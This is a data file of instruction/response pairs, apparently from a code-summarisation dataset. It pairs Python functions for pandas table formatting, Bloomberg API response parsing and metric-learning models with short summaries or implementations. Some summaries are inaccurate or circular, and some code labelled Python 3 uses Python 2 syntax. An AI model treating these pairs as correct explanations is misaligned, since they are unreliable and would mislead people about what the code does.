{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef apply(self, **kwargs):\n\n        def _apply_if_avail(key, fct):\n            if key in kwargs:\n                val = kwargs.pop(key)\n                if val is not None:\n                    fct(val)\n\n        _apply_if_avail('styles', lambda v: self.apply_styles(v))\n        _apply_if_avail('cstyles', lambda v: self.apply_conditional_styles(v))\n        _apply_if_avail('format', lambda v: self.apply_format(v))\n        _apply_if_avail('c', lambda v: self.apply_colattrs(value=v))\n        _apply_if_avail('cmin', lambda v: self.apply_colattrs(min=v))\n        _apply_if_avail('cmax', lambda v: self.apply_colattrs(max=v))\n        _apply_if_avail('cweight', lambda v: self.apply_colattrs(weight=v))\n        _apply_if_avail('r', lambda v: self.apply_rowattrs(value=v))\n        _apply_if_avail('rmin', lambda v: self.apply_rowattrs(min=v))\n        _apply_if_avail('rmax', lambda v: self.apply_rowattrs(max=v))\n        _apply_if_avail('rweight', lambda v: self.apply_rowattrs(weight=v))\n        _apply_if_avail('rspans', lambda v: v and self.detect_rowspans())\n        _apply_if_avail('cspans', lambda v: v and self.detect_colspans())\n        _apply_if_avail('spans', lambda v: v and (self.detect_rowspans(), self.detect_colspans()))", "response": "Applies the attributes of the current recordset to the current recordset."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef guess_number_format(self, rb=1, align=1, **fmt_args):\n        fct = fmt.guess_formatter(self.actual_values, **fmt_args)\n        return self.apply_number_format(fct, rb=rb, align=align)", "response": "Guess the most appropriate number format by inspected all the region values"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\napplying dynamic number formatting to the cell value", "response": "def dynamic_number_format(self, rb=1, align=1, **fmt_args):\n        \"\"\"Formatter changes based on the cell value\"\"\"\n        fct = fmt.DynamicNumberFormatter(**fmt_args)\n        return self.apply_number_format(fct, rb=rb, align=align)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nset the fixed height of the rows in the archive", "response": "def set_row_heights(self, pcts=None, amts=None, maxs=None, mins=None):\n        \"\"\"\n        :param pcts: the percent of available height to use or ratio is also ok\n        :param amts: (Array or scalar) the fixed height of the rows\n        :param maxs: (Array or scalar) the maximum height of the rows (only use when pcts is used)\n        :param mins: (Array or scalar) the minimum height of the rows (only used when pcts is used)\n        :return:\n        \"\"\"\n        for arr, attr in zip([pcts, amts, maxs, mins], ['weight', 'value', 'max', 'min']):\n            if arr is not None:\n                if not np.isscalar(arr):\n                    if len(arr) != len(self.formatted_values.index):\n                        raise ValueError(\n                            '%s: expected %s rows but got %s' % (attr, len(arr), len(self.formatted_values.index)))\n                self.rowattrs.ix[:, attr] = arr\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef set_col_widths(self, pcts=None, amts=None, maxs=None, mins=None):\n        for arr, attr in zip([pcts, amts, maxs, mins], ['weight', 'value', 'max', 'min']):\n            if arr is not None:\n                if not np.isscalar(arr):\n                    if len(arr) != len(self.formatted_values.columns):\n                        raise ValueError(\n                            '%s: expected %s cols but got %s' % (attr, len(arr), len(self.formatted_values.columns)))\n                self.colattrs.ix[:, attr] = arr\n        return self", "response": "set the fixed width of the columns of the records in the archive"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _find_column_label_positions(self, match_value_or_fct, levels=None):\n        allmatches = find_locations(self.df.columns, match_value_or_fct, levels)\n        if allmatches and self.inc_index:  # tramslate back\n            allmatches = [m + self.nidxs for m in allmatches]\n        return allmatches", "response": "Find the locations of columns in the original DataFrame to find the locations of columns within the region of the index."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfind the locations of rows in the original DataFrame to find the locations of rows within the region.", "response": "def _find_row_label_positions(self, match_value_or_fct, levels=None):\n        \"\"\"Check the original DataFrame's row labels to find the locations of rows. And return the adjusted\n        row indexing within region (offset if including index)\"\"\"\n        allmatches = find_locations(self.df.index, match_value_or_fct, levels)\n        if allmatches and self.inc_index:  # tramslate back\n            allmatches = [m + self.nhdrs for m in allmatches]\n        return allmatches"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nguessing the best formatter for the given values.", "response": "def guess_formatter(values, precision=1, commas=True, parens=True, nan='nan', prefix=None, pcts=0,\n                    trunc_dot_zeros=0):\n    \"\"\"Based on the values, return the most suitable formatter\n    Parameters\n    ----------\n    values : Series, DataFrame, scalar, list, tuple, or ndarray\n             Values used to determine which formatter is the best fit\n    \"\"\"\n    formatter_args = dict(precision=precision, commas=commas, parens=parens, nan=nan, prefix=prefix,\n                          trunc_dot_zeros=trunc_dot_zeros)\n\n    try:\n        if isinstance(values, pd.datetime) and values.hour == 0 and values.minute == 0:\n            return new_datetime_formatter()\n        elif is_datetime_arraylike(values):\n            # basic date formatter if no hours or minutes\n            if hasattr(values, 'dt'):\n                if (values.dt.hour == 0).all() and (values.dt.minute == 0).all():\n                    return new_datetime_formatter()\n            elif isinstance(values, pd.Series):\n                if values.dropna().apply(lambda d: d.hour == 0).all() and values.apply(lambda d: d.minute == 0).all():\n                    return new_datetime_formatter()\n            elif isinstance(values, pd.DataFrame):\n                if values.dropna().applymap(lambda d: d != d or (d.hour == 0 and d.minute == 0)).all().all():\n                    return new_datetime_formatter()\n\n        elif isinstance(values, pd.Series):\n            aval = values.abs()\n            vmax, vmin = aval.max(), aval.min()\n        elif isinstance(values, np.ndarray):\n            if values.ndim == 2:\n                avalues = pd.DataFrame(values).abs()\n                vmax = avalues.max().max()\n                vmin = avalues.min().min()\n            elif values.ndim == 1:\n                aval = pd.Series(values).abs()\n                vmax, vmin = aval.max(), aval.min()\n            else:\n                raise ValueError('cannot accept frame with more than 2-dimensions')\n        elif isinstance(values, pd.DataFrame):\n            avalues = values.abs()\n            vmax = avalues.max().max()\n            vmin = avalues.min().min()\n        elif isinstance(values, (list, tuple)):\n            vmax = max(values)\n            vmin = min(values)\n        else:\n            vmax = vmin = abs(values)\n\n        if np.isnan(vmin):\n            return new_float_formatter(**formatter_args)\n        else:\n            min_digits = 0 if vmin == 0 else math.floor(math.log10(vmin))\n            # max_digits = math.floor(math.log10(vmax))\n            if min_digits >= 12:\n                return new_trillions_formatter(**formatter_args)\n            elif min_digits >= 9:\n                return new_billions_formatter(**formatter_args)\n            elif min_digits >= 6:\n                return new_millions_formatter(**formatter_args)\n            elif min_digits >= 3:\n                return new_thousands_formatter(**formatter_args)\n            elif pcts and min_digits < 0 and vmax < 1:\n                return new_percent_formatter(**formatter_args)\n            else:\n                if isinstance(vmax, int):\n                    formatter_args.pop('precision')\n                    return new_int_formatter(**formatter_args)\n                else:\n                    return new_float_formatter(**formatter_args)\n    except:\n        # import sys\n        # e = sys.exc_info()[0]\n        return lambda x: x"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_summary_page(self):\n        s = PortfolioSummary()\n        s.include_long_short()\n        pieces = []\n        for r in self.results:\n            tmp = s(r.port, PortfolioSummary.analyze_returns)\n            tmp['desc'] = r.desc\n            tmp['sid'] = r.sid\n            tmp = tmp.set_index(['sid', 'desc'], append=1).reorder_levels([2, 1, 0])\n            pieces.append(tmp)\n        frame = pd.concat(pieces)\n\n        tf = self.pdf.table_formatter(frame)\n        tf.apply_basic_style(cmap=self.table_style)\n        # [col.guess_format(pcts=1, trunc_dot_zeros=1) for col in tf.cells.iter_cols()]\n        tf.cells.match_column_labels(['nmonths', 'cnt', 'win cnt', 'lose cnt', 'dur max']).int_format()\n        tf.cells.match_column_labels(['sharpe ann', 'sortino', 'dur avg']).float_format(precision=1)\n        tf.cells.match_column_labels(['maxdd dt']).apply_format(new_datetime_formatter('%d-%b-%y'))\n        tf.cells.match_column_labels(['cagr', 'mret avg', 'mret std ann', 'ret std', 'mret avg ann', 'maxdd', 'avg dd',\n                                      'winpct', 'ret avg', 'ret min', 'ret max']).percent_format()\n\n        self.pdf.build_page('summary', {'F1': tf.build()})", "response": "Build a table which shows overview of the portfolios"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nproviding a security data iterator by returning a tuple of Element SecurityError", "response": "def security_iter(nodearr):\n        \"\"\" provide a security data iterator by returning a tuple of (Element, SecurityError) which are mutually exclusive \"\"\"\n        assert nodearr.name() == 'securityData' and nodearr.isArray()\n        for i in range(nodearr.numValues()):\n            node = nodearr.getValue(i)\n            err = XmlHelper.get_security_error(node)\n            result = (None, err) if err else (node, None)\n            yield result"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nproviding an iterator which checks for a response error prior to returning", "response": "def message_iter(evt):\n        \"\"\" provide a message iterator which checks for a response error prior to returning \"\"\"\n        for msg in evt:\n            if logger.isEnabledFor(log.logging.DEBUG):\n                logger.debug(msg.toString())\n            if msg.asElement().hasElement('responseError'):\n                raise Exception(msg.toString())\n            yield msg"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting an element with DataType Sequence to a DataFrame.", "response": "def get_sequence_value(node):\n        \"\"\"Convert an element with DataType Sequence to a DataFrame.\n        Note this may be a naive implementation as I assume that bulk data is always a table\n        \"\"\"\n        assert node.datatype() == 15\n        data = defaultdict(list)\n        cols = []\n        for i in range(node.numValues()):\n            row = node.getValue(i)\n            if i == 0:  # Get the ordered cols and assume they are constant\n                cols = [str(row.getElement(_).name()) for _ in range(row.numElements())]\n\n            for cidx in range(row.numElements()):\n                col = row.getElement(cidx)\n                data[str(col.name())].append(XmlHelper.as_value(col))\n        return pd.DataFrame(data, columns=cols)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts the specified element into a python value", "response": "def as_value(ele):\n        \"\"\" convert the specified element as a python value \"\"\"\n        dtype = ele.datatype()\n        # print '%s = %s' % (ele.name(), dtype)\n        if dtype in (1, 2, 3, 4, 5, 6, 7, 9, 12):\n            # BOOL, CHAR, BYTE, INT32, INT64, FLOAT32, FLOAT64, BYTEARRAY, DECIMAL)\n            return ele.getValue()\n        elif dtype == 8:  # String\n            val = ele.getValue()\n            \"\"\"\n            if val:\n                # us centric :)\n                val = val.encode('ascii', 'replace')\n            \"\"\"\n            return str(val)\n        elif dtype == 10:  # Date\n            if ele.isNull():\n                return pd.NaT\n            else:\n                v = ele.getValue()\n                return datetime(year=v.year, month=v.month, day=v.day) if v else pd.NaT\n        elif dtype == 11:  # Time\n            if ele.isNull():\n                return pd.NaT\n            else:\n                v = ele.getValue()\n                now = pd.datetime.now()\n                return datetime(year=now.year, month=now.month, day=now.day, hour=v.hour, minute=v.minute, second=v.second).time() if v else np.nan\n        elif dtype == 13:  # Datetime\n            if ele.isNull():\n                return pd.NaT\n            else:\n                v = ele.getValue()\n                return v\n        elif dtype == 14:  # Enumeration\n            # raise NotImplementedError('ENUMERATION data type needs implemented')\n            return str(ele.getValue())\n        elif dtype == 16:  # Choice\n            raise NotImplementedError('CHOICE data type needs implemented')\n        elif dtype == 15:  # SEQUENCE\n            return XmlHelper.get_sequence_value(ele)\n        else:\n            raise NotImplementedError('Unexpected data type %s. Check documentation' % dtype)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_child_value(parent, name, allow_missing=0):\n        if not parent.hasElement(name):\n            if allow_missing:\n                return np.nan\n            else:\n                raise Exception('failed to find child element %s in parent' % name)\n        else:\n            return XmlHelper.as_value(parent.getElement(name))", "response": "get the value of the child element with name in the parent Element"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_child_values(parent, names):\n        vals = []\n        for name in names:\n            if parent.hasElement(name):\n                vals.append(XmlHelper.as_value(parent.getElement(name)))\n            else:\n                vals.append(np.nan)\n        return vals", "response": "return a list of values for the specified child fields."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef as_field_error(node, secid):\n        assert node.name() == 'fieldExceptions'\n        if node.isArray():\n            return [XmlHelper.as_field_error(node.getValue(_), secid) for _ in range(node.numValues())]\n        else:\n            fld = XmlHelper.get_child_value(node, 'fieldId')\n            info = node.getElement('errorInfo')\n            src = XmlHelper.get_child_value(info, 'source')\n            code = XmlHelper.get_child_value(info, 'code')\n            cat = XmlHelper.get_child_value(info, 'category')\n            msg = XmlHelper.get_child_value(info, 'message')\n            subcat = XmlHelper.get_child_value(info, 'subcategory')\n            return FieldError(security=secid, field=fld, source=src, code=code, category=cat, message=msg,\n                              subcategory=subcat)", "response": "convert a fieldExceptions element to a FieldError or FieldError array"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_security_error(node):\n        assert node.name() == 'securityData' and not node.isArray()\n        if node.hasElement('securityError'):\n            secid = XmlHelper.get_child_value(node, 'security')\n            err = XmlHelper.as_security_error(node.getElement('securityError'), secid)\n            return err\n        else:\n            return None", "response": "Returns a SecurityError if the specified securityData element has one. Otherwise returns None."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a list of FieldErrors if the specified securityData element has field errors", "response": "def get_field_errors(node):\n        \"\"\" return a list of FieldErrors if the specified securityData element has field errors \"\"\"\n        assert node.name() == 'securityData' and not node.isArray()\n        nodearr = node.getElement('fieldExceptions')\n        if nodearr.numValues() > 0:\n            secid = XmlHelper.get_child_value(node, 'security')\n            errors = XmlHelper.as_field_error(nodearr, secid)\n            return errors\n        else:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_flag(self, request, val, fld):\n        if val is not None:\n            val = bool(val)\n            request.set(fld, val)", "response": "Sets the specified field to the specified value."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a Multi - Index DataFrame with the response map as a single - index DataFrame.", "response": "def as_frame(self):\n        \"\"\" :return: Multi-Index DataFrame \"\"\"\n        sids, frames = self.response_map.keys(), self.response_map.values()\n        frame = pd.concat(frames, keys=sids, axis=1)\n        return frame"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef as_frame(self):\n        data = {sid: pd.Series(data) for sid, data in self.response_map.iteritems()}\n        frame = pd.DataFrame.from_dict(data, orient='index')\n        # layer in any missing fields just in case\n        frame = frame.reindex_axis(self.request.fields, axis=1)\n        return frame", "response": "Returns a Multi - Index DataFrame"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprocess the incoming tick data array", "response": "def on_tick_data(self, ticks):\n        \"\"\"Process the incoming tick data array\"\"\"\n        for tick in XmlHelper.node_iter(ticks):\n            names = [str(tick.getElement(_).name()) for _ in range(tick.numElements())]\n            tickmap = {n: XmlHelper.get_child_value(tick, n) for n in names}\n            self.response.ticks.append(tickmap)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef on_bar_data(self, bars):\n        for tick in XmlHelper.node_iter(bars):\n            names = [str(tick.getElement(_).name()) for _ in range(tick.numElements())]\n            barmap = {n: XmlHelper.get_child_value(tick, n) for n in names}\n            self.response.bars.append(barmap)", "response": "Process the incoming tick data array"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the response map as a Multi - Index DataFrame", "response": "def as_frame(self):\n        \"\"\" :return: Multi-Index DataFrame \"\"\"\n        data = {sid: pd.Series(data) for sid, data in self.response_map.iteritems()}\n        return pd.DataFrame.from_dict(data, orient='index')"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nprovides a security data iterator by returning a tuple of Element SecurityError", "response": "def security_iter(nodearr):\n        \"\"\" provide a security data iterator by returning a tuple of (Element, SecurityError) which are mutually exclusive \"\"\"\n        assert nodearr.Name == 'securityData' and nodearr.IsArray\n        for i in range(nodearr.NumValues):\n            node = nodearr.GetValue(i)\n            err = XmlHelper.get_security_error(node)\n            result = (None, err) if err else (node, None)\n            yield result"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef message_iter(evt):\n        iter = evt.CreateMessageIterator()\n        while iter.Next():\n            msg = iter.Message\n            if DEBUG:\n                print msg.Print\n            if msg.AsElement.HasElement('responseError'):\n                raise Exception(msg.AsElement.GetValue('message'))\n            yield msg", "response": "provide a message iterator which checks for a response error prior to returning"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts an element with DataType Sequence to a DataFrame.", "response": "def get_sequence_value(node):\n        \"\"\"Convert an element with DataType Sequence to a DataFrame.\n        Note this may be a naive implementation as I assume that bulk data is always a table\n        \"\"\"\n        assert node.Datatype == 15\n        data = defaultdict(list)\n        cols = []\n        for i in range(node.NumValues):\n            row = node.GetValue(i)\n            if i == 0:  # Get the ordered cols and assume they are constant\n                cols = [str(row.GetElement(_).Name) for _ in range(row.NumElements)]\n\n            for cidx in range(row.NumElements):\n                col = row.GetElement(cidx)\n                data[str(col.Name)].append(XmlHelper.as_value(col))\n        return DataFrame(data, columns=cols)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef as_value(ele):\n        dtype = ele.Datatype\n        #print '%s = %s' % (ele.Name, dtype)\n        if dtype in (1, 2, 3, 4, 5, 6, 7, 9, 12):\n            # BOOL, CHAR, BYTE, INT32, INT64, FLOAT32, FLOAT64, BYTEARRAY, DECIMAL)\n            return ele.Value\n        elif dtype == 8:  # String\n            val = ele.Value\n            if val:\n                # us centric :)\n                val = val.encode('ascii', 'replace')\n            return str(val)\n        elif dtype == 10:  # Date\n            v = ele.Value\n            return datetime(year=v.year, month=v.month, day=v.day).date() if v else np.nan\n        elif dtype == 11:  # Time\n            v = ele.Value\n            return datetime(hour=v.hour, minute=v.minute, second=v.second).time() if v else np.nan\n        elif dtype == 13:  # Datetime\n            v = ele.Value\n            return datetime(year=v.year, month=v.month, day=v.day, hour=v.hour, minute=v.minute, second=v.second)\n        elif dtype == 14:  # Enumeration\n            raise NotImplementedError('ENUMERATION data type needs implemented')\n        elif dtype == 16:  # Choice\n            raise NotImplementedError('CHOICE data type needs implemented')\n        elif dtype == 15:  # SEQUENCE\n            return XmlHelper.get_sequence_value(ele)\n        else:\n            raise NotImplementedError('Unexpected data type %s. Check documentation' % dtype)", "response": "convert the specified element into a python value"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets the value of the child element with name in the parent Element", "response": "def get_child_value(parent, name, allow_missing=0):\n        \"\"\" return the value of the child element with name in the parent Element \"\"\"\n        if not parent.HasElement(name):\n            if allow_missing:\n                return np.nan\n            else:\n                raise Exception('failed to find child element %s in parent' % name)\n        else:\n            return XmlHelper.as_value(parent.GetElement(name))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_child_values(parent, names):\n        vals = []\n        for name in names:\n            if parent.HasElement(name):\n                vals.append(XmlHelper.as_value(parent.GetElement(name)))\n            else:\n                vals.append(np.nan)\n        return vals", "response": "return a list of values for the specified child fields."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts the securityError element to a SecurityError", "response": "def as_security_error(node, secid):\n        \"\"\" convert the securityError element to a SecurityError \"\"\"\n        assert node.Name == 'securityError'\n        src = XmlHelper.get_child_value(node, 'source')\n        code = XmlHelper.get_child_value(node, 'code')\n        cat = XmlHelper.get_child_value(node, 'category')\n        msg = XmlHelper.get_child_value(node, 'message')\n        subcat = XmlHelper.get_child_value(node, 'subcategory')\n        return SecurityError(security=secid, source=src, code=code, category=cat, message=msg, subcategory=subcat)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef as_field_error(node, secid):\n        assert node.Name == 'fieldExceptions'\n        if node.IsArray:\n            return [XmlHelper.as_field_error(node.GetValue(_), secid) for _ in range(node.NumValues)]\n        else:\n            fld = XmlHelper.get_child_value(node, 'fieldId')\n            info = node.GetElement('errorInfo')\n            src = XmlHelper.get_child_value(info, 'source')\n            code = XmlHelper.get_child_value(info, 'code')\n            cat = XmlHelper.get_child_value(info, 'category')\n            msg = XmlHelper.get_child_value(info, 'message')\n            subcat = XmlHelper.get_child_value(info, 'subcategory')\n            return FieldError(security=secid, field=fld, source=src, code=code, category=cat, message=msg,\n                              subcategory=subcat)", "response": "convert a fieldExceptions element to a FieldError or FieldError array"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_security_error(node):\n        assert node.Name == 'securityData' and not node.IsArray\n        if node.HasElement('securityError'):\n            secid = XmlHelper.get_child_value(node, 'security')\n            err = XmlHelper.as_security_error(node.GetElement('securityError'), secid)\n            return err\n        else:\n            return None", "response": "Returns a SecurityError object from the specified securityData element."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_field_errors(node):\n        assert node.Name == 'securityData' and not node.IsArray\n        nodearr = node.GetElement('fieldExceptions')\n        if nodearr.NumValues > 0:\n            secid = XmlHelper.get_child_value(node, 'security')\n            errors = XmlHelper.as_field_error(nodearr, secid)\n            return errors\n        else:\n            return None", "response": "returns a list of FieldErrors if the specified securityData element has field errors"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncalls by the daemon to initialize the internal state.", "response": "def do_init(self, handler):\n        \"\"\" will be called prior to waiting for the message \"\"\"\n        self.waiting = True\n        self.exc_info = None\n        self.handler = handler"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef apply_overrides(request, omap):\n        if omap:\n            for k, v in omap.iteritems():\n                o = request.GetElement('overrides').AppendElment()\n                o.SetElement('fieldId', k)\n                o.SetElement('value', v)", "response": "add the given overrides to the given bloomberg request"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the response as a single series", "response": "def response_as_series(self):\n        \"\"\" Return the response as a single series \"\"\"\n        assert len(self.symbols) == 1, 'expected single request'\n        if self.response_type == 'frame':\n            return self.response.ix[self.symbols[0]]\n        else:\n            return pandas.Series(self.response[self.symbols])"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef on_event(self, evt, is_final):\n        for msg in XmlHelper.message_iter(evt):\n            # Single security element in historical request\n            node = msg.GetElement('securityData')\n            if node.HasElement('securityError'):\n                secid = XmlHelper.get_child_value(node, 'security')\n                self.security_errors.append(XmlHelper.as_security_error(node.GetElement('securityError'), secid))\n            else:\n                self.on_security_data_node(node)", "response": "This method is invoked from COM PumpWaitingMessages - different thread"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef response_as_single(self, copy=0):\n        arr = []\n        for sid, frame in self.response.iteritems():\n            if copy:\n                frame = frame.copy()\n            'security' not in frame and frame.insert(0, 'security', sid)\n            arr.append(frame.reset_index().set_index(['date', 'security']))\n        return concat(arr).unstack()", "response": "convert the response map to a single data frame with Multi - Index columns"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef on_event(self, evt, is_final):\n        response = self.response\n        for msg in XmlHelper.message_iter(evt):\n            bars = msg.GetElement('barData').GetElement('barTickData')\n            for i in range(bars.NumValues):\n                bar = bars.GetValue(i)\n                ts = bar.GetElement(0).Value\n                response['time'].append(datetime(ts.year, ts.month, ts.day, ts.hour, ts.minute))\n                response['open'].append(bar.GetElement(1).Value)\n                response['high'].append(bar.GetElement(2).Value)\n                response['low'].append(bar.GetElement(3).Value)\n                response['close'].append(bar.GetElement(4).Value)\n                response['volume'].append(bar.GetElement(5).Value)\n                response['events'].append(bar.GetElement(6).Value)\n\n        if is_final:\n            idx = response.pop('time')\n            self.response = DataFrame(response, columns=['open', 'high', 'low', 'close', 'volume', 'events'], index=idx)", "response": "this is invoked from COM PumpWaitingMessages - different thread"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fit(self, X, y, random_state=np.random):\n    if self.num_labeled != 'deprecated':\n      warnings.warn('\"num_labeled\" parameter is not used.'\n                    ' It has been deprecated in version 0.5.0 and will be'\n                    'removed in 0.6.0', DeprecationWarning)\n    X, y = self._prepare_inputs(X, y, ensure_min_samples=2)\n    num_constraints = self.num_constraints\n    if num_constraints is None:\n      num_classes = len(np.unique(y))\n      num_constraints = 20 * num_classes**2\n\n    c = Constraints(y)\n    pos_neg = c.positive_negative_pairs(num_constraints, same_length=True,\n                                        random_state=random_state)\n    return _BaseLSML._fit(self, X[np.column_stack(pos_neg)],\n                          weights=self.weights)", "response": "Fits the LSML model on the data."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fit(self, X, y):\n      X, y = self._prepare_inputs(X, y, y_numeric=True,\n                                  ensure_min_samples=2)\n      n, d = X.shape\n      if y.shape[0] != n:\n          raise ValueError('Data and label lengths mismatch: %d != %d'\n                           % (n, y.shape[0]))\n\n      A = self.A0\n      m = self.num_dims\n      if m is None:\n          m = d\n      if A is None:\n          # initialize to PCA transformation matrix\n          # note: not the same as n_components=m !\n          A = PCA().fit(X).components_.T[:m]\n      elif A.shape != (m, d):\n          raise ValueError('A0 needs shape (%d,%d) but got %s' % (\n              m, d, A.shape))\n\n      # Measure the total training time\n      train_time = time.time()\n\n      self.n_iter_ = 0\n      res = minimize(self._loss, A.ravel(), (X, y), method='L-BFGS-B',\n                     jac=True, tol=self.tol,\n                     options=dict(maxiter=self.max_iter))\n      self.transformer_ = res.x.reshape(A.shape)\n\n      # Stop timer\n      train_time = time.time() - train_time\n      if self.verbose:\n          cls_name = self.__class__.__name__\n          # Warn the user if the algorithm did not converge\n          if not res.success:\n              warnings.warn('[{}] MLKR did not converge: {}'\n                            .format(cls_name, res.message), ConvergenceWarning)\n          print('[{}] Training took {:8.2f}s.'.format(cls_name, train_time))\n\n      return self", "response": "Fit the MLKR model with the given data."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfit the NCA model on the data.", "response": "def fit(self, X, y):\n    \"\"\"\n    X: data matrix, (n x d)\n    y: scalar labels, (n)\n    \"\"\"\n    X, labels = self._prepare_inputs(X, y, ensure_min_samples=2)\n    n, d = X.shape\n    num_dims = self.num_dims\n    if num_dims is None:\n        num_dims = d\n\n    # Measure the total training time\n    train_time = time.time()\n\n    # Initialize A to a scaling matrix\n    A = np.zeros((num_dims, d))\n    np.fill_diagonal(A, 1./(np.maximum(X.max(axis=0)-X.min(axis=0), EPS)))\n\n    # Run NCA\n    mask = labels[:, np.newaxis] == labels[np.newaxis, :]\n    optimizer_params = {'method': 'L-BFGS-B',\n                        'fun': self._loss_grad_lbfgs,\n                        'args': (X, mask, -1.0),\n                        'jac': True,\n                        'x0': A.ravel(),\n                        'options': dict(maxiter=self.max_iter),\n                        'tol': self.tol\n                        }\n\n    # Call the optimizer\n    self.n_iter_ = 0\n    opt_result = minimize(**optimizer_params)\n\n    self.transformer_ = opt_result.x.reshape(-1, X.shape[1])\n    self.n_iter_ = opt_result.nit\n\n    # Stop timer\n    train_time = time.time() - train_time\n    if self.verbose:\n      cls_name = self.__class__.__name__\n\n      # Warn the user if the algorithm did not converge\n      if not opt_result.success:\n        warnings.warn('[{}] NCA did not converge: {}'.format(\n            cls_name, opt_result.message), ConvergenceWarning)\n\n      print('[{}] Training took {:8.2f}s.'.format(cls_name, train_time))\n\n    return self"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef chunks(self, num_chunks=100, chunk_size=2, random_state=np.random):\n    chunks = -np.ones_like(self.known_label_idx, dtype=int)\n    uniq, lookup = np.unique(self.known_labels, return_inverse=True)\n    all_inds = [set(np.where(lookup==c)[0]) for c in xrange(len(uniq))]\n    idx = 0\n    while idx < num_chunks and all_inds:\n      if len(all_inds) == 1:\n        c = 0\n      else:\n        c = random_state.randint(0, high=len(all_inds)-1)\n      inds = all_inds[c]\n      if len(inds) < chunk_size:\n        del all_inds[c]\n        continue\n      ii = random_state.choice(list(inds), chunk_size, replace=False)\n      inds.difference_update(ii)\n      chunks[ii] = idx\n      idx += 1\n    if idx < num_chunks:\n      raise ValueError('Unable to make %d chunks of %d examples each' %\n                       (num_chunks, chunk_size))\n    return chunks", "response": "Generate num_chunks examples of the same size as the input dataset."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nfitting the transformer to the data matrix X.", "response": "def fit(self, X, y=None):\n    \"\"\"\n    X : data matrix, (n x d)\n    y : unused\n    \"\"\"\n    X = self._prepare_inputs(X, ensure_min_samples=2)\n    M = np.cov(X, rowvar = False)\n    if M.ndim == 0:\n      M = 1./M\n    else:\n      M = np.linalg.inv(M)\n\n    self.transformer_ = transformer_from_metric(np.atleast_2d(M))\n    return self"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nlearning full metric using MMC.", "response": "def _fit_full(self, pairs, y):\n    \"\"\"Learn full metric using MMC.\n\n    Parameters\n    ----------\n    X : (n x d) data matrix\n        each row corresponds to a single instance\n    constraints : 4-tuple of arrays\n        (a,b,c,d) indices into X, with (a,b) specifying similar and (c,d)\n        dissimilar pairs\n    \"\"\"\n    num_dim = pairs.shape[2]\n\n    error1 = error2 = 1e10\n    eps = 0.01        # error-bound of iterative projection on C1 and C2\n    A = self.A_\n\n    pos_pairs, neg_pairs = pairs[y == 1], pairs[y == -1]\n\n    # Create weight vector from similar samples\n    pos_diff = pos_pairs[:, 0, :] - pos_pairs[:, 1, :]\n    w = np.einsum('ij,ik->jk', pos_diff, pos_diff).ravel()\n    # `w` is the sum of all outer products of the rows in `pos_diff`.\n    # The above `einsum` is equivalent to the much more inefficient:\n    # w = np.apply_along_axis(\n    #         lambda x: np.outer(x,x).ravel(),\n    #         1,\n    #         X[a] - X[b]\n    #     ).sum(axis = 0)\n    t = w.dot(A.ravel()) / 100.0\n\n    w_norm = np.linalg.norm(w)\n    w1 